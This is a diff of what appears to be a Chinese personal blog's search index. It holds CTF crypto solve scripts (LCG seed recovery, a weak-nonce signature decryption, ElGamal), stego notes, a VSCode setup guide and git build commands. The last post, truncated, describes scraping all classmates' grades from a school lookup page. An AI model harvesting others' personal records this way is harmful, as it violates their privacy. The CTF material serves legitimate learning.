class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="lcg"><a href="#lcg" class="headerlink" title="lcg"></a>lcg</h3><p>从网上找个个脚本，写的很详细</p>
-<p><a href="https://blog.csdn.net/superprintf/article/details/108964563">https://blog.csdn.net/superprintf/article/details/108964563</a></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">flag = &#x27;&#x27;.encode()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">seed = bytes_to_long(flag)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(seed)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">length = seed.bit_length()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(length)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">n=getPrime(length)</span></span><br><span class="line"><span class="string">a=getPrime(length)</span></span><br><span class="line"><span class="string">b=getPrime(length)</span></span><br><span class="line"><span class="string">s=[]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(10):</span></span><br><span class="line"><span class="string">    seed = (a*seed+b)%n</span></span><br><span class="line"><span class="string">    s.append(seed)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(s)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span> </span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>): </span><br><span class="line">        <span class="keyword">return</span> a </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b) </span><br><span class="line">s=[<span class="number">64053834035066785058511795263859088093402576718387054930069870694827422995248363210875296865931156540418540088656840163752864867889701529</span>, <span class="number">62747878069691338351001678737533032651009187924993079609551517187402239263500990458468121965725468864035542647616568888614971291913860683</span>, <span class="number">8610389166165547798963079074461089122942923569827711232062490735297527674581120584017030806864406444034839689358368567214353599295961192</span>, <span class="number">67368398051089407366868405625671942347378755129423872678285919732014302509367453094142041707571135936337763803644340301362544880144675515</span>, <span class="number">3140546334522640626644397935274312967014650101920766829848908314358452633165879115222769049730993718556007257838431843662986174886332684</span>, <span class="number">86570894867827558107244361752089586436766881136739525172025909326268148819720261812567282066327259810017581923500053674785415315313293458</span>, <span class="number">74270633946662538117925791534180331044438757906314082041974053142483165604719102121031974214138125154407150853174565679126633465007917723</span>, <span class="number">82222345180880564316408536364709779418528442531150999715627704885024880160675971236916036110841803202987616501846568355385621016171784903</span>, <span class="number">79833541796675422937999973936505826001046326324194169378072775519666431460490483847928549009565561011528302879850550395115321828798479473</span>, <span class="number">70276250399219459795079058514491950109021040664671993784167534811426903455184545174600178849521746939676479421177456528336980088529680364</span>]</span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    t.append(s[i]-s[i-<span class="number">1</span>]) </span><br><span class="line">all_n = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    all_n.append(gcd((t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>]-t[i]*t[i]), (t[i+<span class="number">2</span>]*t[i]-t[i+<span class="number">1</span>]*t[i+<span class="number">1</span>]))) </span><br><span class="line"></span><br><span class="line">MMI = <span class="keyword">lambda</span> A, n,s=<span class="number">1</span>,t=<span class="number">0</span>,N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t%N <span class="keyword">or</span> MMI(n, A%n, t, s-A//n*t, N <span class="keyword">or</span> n),-<span class="number">1</span>)[n&lt;<span class="number">1</span>] <span class="comment">#逆元计算</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> all_n:</span><br><span class="line">    n=<span class="built_in">abs</span>(n)</span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    a=(s[<span class="number">2</span>]-s[<span class="number">1</span>])*MMI((s[<span class="number">1</span>]-s[<span class="number">0</span>]),n)%n</span><br><span class="line">    ani=MMI(a,n)</span><br><span class="line">    b=(s[<span class="number">1</span>]-a*s[<span class="number">0</span>])%n</span><br><span class="line">    seed = (ani*(s[<span class="number">0</span>]-b))%n</span><br><span class="line">    plaintext=seed</span><br><span class="line">    print(long_to_bytes(plaintext))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="Dear-Alice"><a href="#Dear-Alice" class="headerlink" title="Dear Alice"></a>Dear Alice</h3><p>google ctf 2021原题</p>
-<p><a href="https://github.com/Haorical/Wargames/tree/master/google-2021/h1">https://github.com/Haorical/Wargames/tree/master/google-2021/h1</a></p>
-<p>嫖到脚本</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INF = (<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="number">311315114987715623444276142623839583360207853110657101019745009424926710590583360123029204556690633449715530612380512577293882572730509350735778781050933</span></span><br><span class="line"></span><br><span class="line">mod = <span class="number">8948962207650232551656602815159153422162609644098354511344597187200057010413552439917934304191956942765446530386427345937963894309923928536070534607816947</span></span><br><span class="line">a = <span class="number">6294860557973063227666421306476379324074715770622746227136910445450301914281276098027990968407983962691151853678563877834221834027439718238065725844264138</span></span><br><span class="line">b = <span class="number">3245789008328967059274849584342077916531909009637501918328323668736179176583263496463525128488282611559800773506973771797764811498834995234341530862286627</span></span><br><span class="line">n = <span class="number">8948962207650232551656602815159153422162609644098354511344597187200057010413418528378981730643524959857451398370029280583094215613882043973354392115544169</span></span><br><span class="line">G = (<span class="number">5139617820728399941653175323358137352238277428061991823713659546881441331696699723004749024403291797641521696406798421624364096550661311227399430098134141</span>,</span><br><span class="line">     <span class="number">1798860115416690485862271986832828064808333512613833729548071279524320966991708554765227095605106785724406691559310536469721469398449016850588110200884962</span>,</span><br><span class="line">     <span class="number">5042518522433577951395875294780962682755843408950010956510838422057522452845550974098236475624683438351211176927595173916071040272153903968536756498306512</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Double</span>(<span class="params">p</span>):</span></span><br><span class="line">    x, y, z = p</span><br><span class="line">    <span class="keyword">if</span> z == <span class="number">0</span> <span class="keyword">or</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> INF</span><br><span class="line">    ysqr = y * y % mod</span><br><span class="line">    zsqr = z * z % mod</span><br><span class="line">    s = <span class="number">4</span> * x * ysqr % mod</span><br><span class="line">    m = (<span class="number">3</span> * x * x + a * zsqr * zsqr) % mod</span><br><span class="line">    x2 = (m * m - <span class="number">2</span> * s) % mod</span><br><span class="line">    y2 = (m * (s - x2) - <span class="number">8</span> * ysqr * ysqr) % mod</span><br><span class="line">    z2 = <span class="number">2</span> * y * z % mod</span><br><span class="line">    <span class="keyword">return</span> x2, y2, z2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">p, q</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p[<span class="number">2</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> q</span><br><span class="line">    <span class="keyword">if</span> q[<span class="number">2</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    x1, y1, z1 = p</span><br><span class="line">    x2, y2, z2 = q</span><br><span class="line">    z1sqr = z1 * z1 % mod</span><br><span class="line">    z2sqr = z2 * z2 % mod</span><br><span class="line">    u1 = x1 * z2sqr % mod</span><br><span class="line">    u2 = x2 * z1sqr % mod</span><br><span class="line">    s1 = y1 * z2 * z2sqr % mod</span><br><span class="line">    s2 = y2 * z1 * z1sqr % mod</span><br><span class="line">    <span class="keyword">if</span> u1 == u2:</span><br><span class="line">        <span class="keyword">if</span> s1 != s2:</span><br><span class="line">            <span class="keyword">return</span> INF</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Double(p)</span><br><span class="line">    h = u2 - u1 % mod</span><br><span class="line">    hsqr = h * h % mod</span><br><span class="line">    hcube = hsqr * h % mod</span><br><span class="line">    r = s2 - s1 % mod</span><br><span class="line">    t = u1 * hsqr % mod</span><br><span class="line">    x3 = (r * r - hcube - <span class="number">2</span> * t) % mod</span><br><span class="line">    y3 = (r * (t - x3) - s1 * hcube) % mod</span><br><span class="line">    z3 = h * z1 * z2 % mod</span><br><span class="line">    <span class="keyword">return</span> x3, y3, z3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Multiply</span>(<span class="params">p, x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p == INF:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    res = INF</span><br><span class="line">    <span class="keyword">while</span> x:</span><br><span class="line">        x, r = <span class="built_in">divmod</span>(x, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> r:</span><br><span class="line">            res = Add(res, p)</span><br><span class="line">        p = Double(p)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Transform</span>(<span class="params">m, l</span>):</span></span><br><span class="line">    z = m</span><br><span class="line">    shift = l - n.bit_length()</span><br><span class="line">    <span class="keyword">if</span> shift &gt; <span class="number">0</span>:</span><br><span class="line">        z &gt;&gt;= shift</span><br><span class="line">    <span class="keyword">return</span> z</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RNG</span>(<span class="params">nbits, a, b</span>):</span></span><br><span class="line">    nbytes = nbits // <span class="number">8</span></span><br><span class="line">    B = os.urandom(nbytes)</span><br><span class="line">    <span class="keyword">return</span> a * <span class="built_in">sum</span>([B[i] * b ** i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(B))]) % <span class="number">2</span>**nbits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sign</span>(<span class="params">msg, d</span>):</span></span><br><span class="line">    h = hashlib.sha512(msg)</span><br><span class="line">    z = Transform(<span class="built_in">int</span>.from_bytes(h.digest(), <span class="string">&#x27;big&#x27;</span>), h.digest_size*<span class="number">8</span>)</span><br><span class="line">    print(<span class="string">&#x27;d = &#x27;</span>, d)</span><br><span class="line">    print(<span class="string">&#x27;z = &#x27;</span>, z)</span><br><span class="line">    k = RNG(n.bit_length(), <span class="number">16843009</span>, <span class="number">4294967296</span>)</span><br><span class="line">    print(<span class="string">&#x27;k = &#x27;</span>, k)</span><br><span class="line">    x1, y1, z1 = Multiply(G, k)</span><br><span class="line">    r = (x1 * <span class="built_in">pow</span>(z1, -<span class="number">2</span>, mod) % mod) % n</span><br><span class="line">    s = <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * d) % n</span><br><span class="line">    print(<span class="string">&#x27;r = &#x27;</span>, r)</span><br><span class="line">    print(<span class="string">&#x27;s = &#x27;</span>, s)</span><br><span class="line">    print(<span class="string">&#x27;left = &#x27;</span>, <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) % n)</span><br><span class="line">    print(<span class="string">&#x27;right = &#x27;</span>, (z + r * d) % n)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">int</span>(s) == <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * d) % n</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Verify</span>(<span class="params">msg, Q, r, s</span>):</span></span><br><span class="line">    h = hashlib.sha512(msg)</span><br><span class="line">    z = Transform(<span class="built_in">int</span>.from_bytes(h.digest(), <span class="string">&#x27;big&#x27;</span>), h.digest_size*<span class="number">8</span>)</span><br><span class="line">    u1 = z*<span class="built_in">pow</span>(s, -<span class="number">1</span>, n) % n</span><br><span class="line">    u2 = r*<span class="built_in">pow</span>(s, -<span class="number">1</span>, n) % n</span><br><span class="line">    x1, y1, z1 = Add(Multiply(G, u1), Multiply(Q, u2))</span><br><span class="line">    <span class="keyword">return</span> r == (x1 * <span class="built_in">pow</span>(z1, -<span class="number">2</span>, mod) % mod) % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span>(<span class="params">plaintext, x</span>):</span></span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(x).encode()).digest()</span><br><span class="line">    aes = algorithms.AES(key)</span><br><span class="line">    encryptor = Cipher(aes, modes.ECB(), default_backend()).encryptor()</span><br><span class="line">    padder = padding.PKCS7(aes.block_size).padder()</span><br><span class="line">    padded_data = padder.update(plaintext) + padder.finalize()</span><br><span class="line">    ciphertext = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">ciphertext, x</span>):</span></span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(x).encode()).digest()</span><br><span class="line">    aes = algorithms.AES(key)</span><br><span class="line">    decryptor = Cipher(aes, modes.ECB(), default_backend()).decryptor()</span><br><span class="line">    unpadder = padding.PKCS7(aes.block_size).unpadder()</span><br><span class="line">    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()</span><br><span class="line">    plaintext = unpadder.update(decrypted_data) + unpadder.finalize()</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line">_, _, ca = (<span class="number">8832295267397231051293216564016639537146222596144354850230682204978731311879255662259663270183445827348338041752369314181111940713714991119349376636404112</span>, <span class="number">8683784208731634307361157916911868656279723101808163939313971801256736484458199874570532609285522391139002296248059424750941962344918156540408403221858292</span>, <span class="number">105398535464409171419472607677747462033030589690350997911381059472020486557672504778060748058626707326992258591478040500759349352824508941100030623708235493999018571171774658661651532338275358740821547158517615704187173346885098836066743736788259192831313414309775979590033581301910426314601982482556670097620</span>)</span><br><span class="line"></span><br><span class="line">ka = [</span><br><span class="line">    <span class="number">0x8a6e81a10c229af504772b51c502638820811034faa62b8dafa019210347918419b71d0638c89b59026b7611edc6a14b2c1c1fb1092a352adfffb7e114f4f385</span>,</span><br><span class="line">    <span class="number">0x3f837315a1fb46097f5eb680697901d75758b859846d37cad33d3f464efb84ace1e85fc60f4e445a031b5ca0e4965e0b081bd4a6e8efea1d3ba07aad51a70cd</span></span><br><span class="line">]</span><br><span class="line">ca = ca.to_bytes(byteorder=<span class="string">&#x27;big&#x27;</span>,length=(ca.bit_length() + <span class="number">7</span>) // <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> ka:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        recv_msg = Decrypt(ca, k)</span><br><span class="line">        print(recv_msg)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="ElGamal"><a href="#ElGamal" class="headerlink" title="ElGamal"></a>ElGamal</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;./output.txt&#x27;</span>).read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">g, h, A, B, p, q = <span class="built_in">eval</span>(data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">c1, c2 = <span class="built_in">eval</span>(data[<span class="number">1</span>])</span><br><span class="line">c1_, c2_ = <span class="built_in">eval</span>(data[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">tmp = gmpy2.powmod(c2, A, p) * gmpy2.powmod(h, B, p) * gmpy2.invert(c2_, p)</span><br><span class="line">tmp = tmp % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;t=&#x27;</span>, tmp</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;A=&#x27;</span>, A</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;p=&#x27;</span>, p</span><br><span class="line">gg, x, y = gmpy2.gcdext(A - <span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span> gg</span><br><span class="line"></span><br><span class="line">m = gmpy2.powmod(tmp, x, p)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(m)[<span class="number">2</span>:].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到-2"><a href="#签到-2" class="headerlink" title="签到"></a>签到</h3><p>base32解码</p>
-<h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>zsteg直接出</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/QQ%E5%9B%BE%E7%89%8720211007231453.png"></p>
-<h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>百度识图，福尔摩斯，搜索发现跳舞的小人</p>
-<p>发现提示信息<a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
-<p>密码文件虽然空白但是占用空间很大，用上面的工具</p>
-<p>最后16进制转字符串得到flag</p>
-<h3 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h3><p>扫描机票上的条形码即可，属于pdf417，m1后面就是姓名</p>
-<p><a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com/</a></p>
-]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CUMT初夏赛部分wp</title>
     <url>/posts/b061f28/</url>
     <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><blockquote>
@@ -1295,43 +1317,6 @@ print(&#39;&#39;.join(flag))
       <tags>
         <tag>ctf</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>VSCode简单配置C艹环境</title>
-    <url>/posts/c150e260/</url>
-    <content><![CDATA[<h2 id="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"><a href="#百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode" class="headerlink" title="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"></a>百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode</h2><h2 id="脑子是个好东西，建议多动手才好用"><a href="#脑子是个好东西，建议多动手才好用" class="headerlink" title="脑子是个好东西，建议多动手才好用"></a>脑子是个好东西，建议多动手才好用</h2><h2 id="需要的东西已打包，还学不会，建议回家种地"><a href="#需要的东西已打包，还学不会，建议回家种地" class="headerlink" title="需要的东西已打包，还学不会，建议回家种地"></a>需要的东西已打包，还学不会，建议回家种地</h2><h2 id="VSCode在官网上下，别TM随便找到个能下的就下"><a href="#VSCode在官网上下，别TM随便找到个能下的就下" class="headerlink" title="VSCode在官网上下，别TM随便找到个能下的就下"></a>VSCode在官网上下，别TM随便找到个能下的就下</h2><blockquote>
-<p>已经帮好几个人装了VSCode，没意思，就这nt操作浪费时间实属没必要，下面详细操作，希望看到的多多传播，不要再白白耗费时间在这无意义的事上</p>
-</blockquote>
-<ol>
-<li>下载链接中的东西</li>
-</ol>
-<ul>
-<li><p>链接：<a href="https://pan.baidu.com/s/1cY9v4UrhH_n61JUoQeXn0Q">https://pan.baidu.com/s/1cY9v4UrhH_n61JUoQeXn0Q</a> 提取码：upvq</p>
-</li>
-<li><p>链接：<a href="https://pan.baidu.com/s/12HPe2Mh3yt-eTiA9Quai8Q">https://pan.baidu.com/s/12HPe2Mh3yt-eTiA9Quai8Q</a> 提取码：zh7k</p>
-</li>
-</ul>
-<ol start="2">
-<li><p>将mingw-w64解压后直接拖入C盘</p>
-</li>
-<li><p>新建fuck文件夹，将.vscode解压后拖入该文件夹中</p>
-</li>
-<li><p>将下面这句添加环境变量,path中新建，不会的百度</p>
-<p> C:\mingw-w64\x86_64-8.1.0-posix-seh-rt_v6-rev0\mingw64\bin</p>
-</li>
-<li><p>vscode中安装必要插件，与C++有关的建议看不懂英文的全装，看的懂的选有用的装，懒得看的也全装</p>
-</li>
-<li><p>右键fuck文件夹，选通过vscode打开,写helloworld测试</p>
-</li>
-<li><p>运行成功的皆大欢喜,不成功的重复1-6步100-200遍，还不成功的，老老实实用你的devc++</p>
-</li>
-<li><p>over</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>哎，我就是玩</category>
-      </categories>
   </entry>
   <entry>
     <title>V&amp;NCTF2021</title>
@@ -1416,6 +1401,58 @@ print(&#39;&#39;.join(flag))
       </tags>
   </entry>
   <entry>
+    <title>VSCode简单配置C艹环境</title>
+    <url>/posts/c150e260/</url>
+    <content><![CDATA[<h2 id="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"><a href="#百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode" class="headerlink" title="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"></a>百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode</h2><h2 id="脑子是个好东西，建议多动手才好用"><a href="#脑子是个好东西，建议多动手才好用" class="headerlink" title="脑子是个好东西，建议多动手才好用"></a>脑子是个好东西，建议多动手才好用</h2><h2 id="需要的东西已打包，还学不会，建议回家种地"><a href="#需要的东西已打包，还学不会，建议回家种地" class="headerlink" title="需要的东西已打包，还学不会，建议回家种地"></a>需要的东西已打包，还学不会，建议回家种地</h2><h2 id="VSCode在官网上下，别TM随便找到个能下的就下"><a href="#VSCode在官网上下，别TM随便找到个能下的就下" class="headerlink" title="VSCode在官网上下，别TM随便找到个能下的就下"></a>VSCode在官网上下，别TM随便找到个能下的就下</h2><blockquote>
+<p>已经帮好几个人装了VSCode，没意思，就这nt操作浪费时间实属没必要，下面详细操作，希望看到的多多传播，不要再白白耗费时间在这无意义的事上</p>
+</blockquote>
+<ol>
+<li>下载链接中的东西</li>
+</ol>
+<ul>
+<li><p>链接：<a href="https://pan.baidu.com/s/1cY9v4UrhH_n61JUoQeXn0Q">https://pan.baidu.com/s/1cY9v4UrhH_n61JUoQeXn0Q</a> 提取码：upvq</p>
+</li>
+<li><p>链接：<a href="https://pan.baidu.com/s/12HPe2Mh3yt-eTiA9Quai8Q">https://pan.baidu.com/s/12HPe2Mh3yt-eTiA9Quai8Q</a> 提取码：zh7k</p>
+</li>
+</ul>
+<ol start="2">
+<li><p>将mingw-w64解压后直接拖入C盘</p>
+</li>
+<li><p>新建fuck文件夹，将.vscode解压后拖入该文件夹中</p>
+</li>
+<li><p>将下面这句添加环境变量,path中新建，不会的百度</p>
+<p> C:\mingw-w64\x86_64-8.1.0-posix-seh-rt_v6-rev0\mingw64\bin</p>
+</li>
+<li><p>vscode中安装必要插件，与C++有关的建议看不懂英文的全装，看的懂的选有用的装，懒得看的也全装</p>
+</li>
+<li><p>右键fuck文件夹，选通过vscode打开,写helloworld测试</p>
+</li>
+<li><p>运行成功的皆大欢喜,不成功的重复1-6步100-200遍，还不成功的，老老实实用你的devc++</p>
+</li>
+<li><p>over</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>哎，我就是玩</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>git更新</title>
+    <url>/posts/bc46b23a/</url>
+    <content><![CDATA[<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><blockquote>
+<p>因为vscode ssh要求服务器git得&gt;2,更新了个git，发现push不上去了，又把服务器搞崩了，还得重新配环境。。。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidoc</span><br><span class="line"></span><br><span class="line">yum install  gcc perl-ExtUtils-MakeMaker</span><br><span class="line"></span><br><span class="line">yum remove git</span><br><span class="line"></span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;</span><br><span class="line"></span><br><span class="line">wget https:&#x2F;&#x2F;mirrors.edge.kernel.org&#x2F;pub&#x2F;software&#x2F;scm&#x2F;git&#x2F;git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">tar -xvf git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">cd git-2.23.0&#x2F;</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git all</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git install</span><br><span class="line"></span><br><span class="line">echo &quot;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;git&#x2F;bin&quot; &gt;&gt; &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">git --version</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>开发工具</category>
+      </categories>
+      <tags>
+        <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>jwt总结</title>
     <url>/posts/e8e4811b/</url>
     <content><![CDATA[]]></content>
@@ -1423,8 +1460,8 @@ print(&#39;&#39;.join(flag))
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -1552,6 +1589,28 @@ str + &#39; &#39; # 连接字符串
       </tags>
   </entry>
   <entry>
+    <title>一次爬虫实战</title>
+    <url>/posts/5a85636c/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近迷上了python，各种花里胡哨的库也太好玩了。</p>
+<p>今天导员发了个查成绩的通知，外加了链接，一个很简单的网页，输入学号姓名就能查，闲来无事就把所有人的全爬下来了，外加做了一波分析（狗头）</p>
+<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>很简单的一个网页</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210923231120.png"></p>
+<p>先抓包分析，发现post的有用的就真的只有个学号姓名，连个前端加密都没有，直接构造就行。</p>
+<p>现学了execel文件读写，用菜的扣脚的beautifulsoup把网页信息提取出来了，很简单。</p>
+<p>而且网站连个反爬都没有，直接请求了好几百次都没限制，无语。</p>
+<p><strong>代码如下，已去除关键信息，仅供学习！</strong></p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> xlsxwriter <span class="keyword">as</span> xw</span><br><span class="line"></span><br><span class="line">stu = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getScores</span>(<span class="params">name,<span class="built_in">id</span></span>):</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;187&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">r&quot;&quot;</span>,</span><br><span class="line">        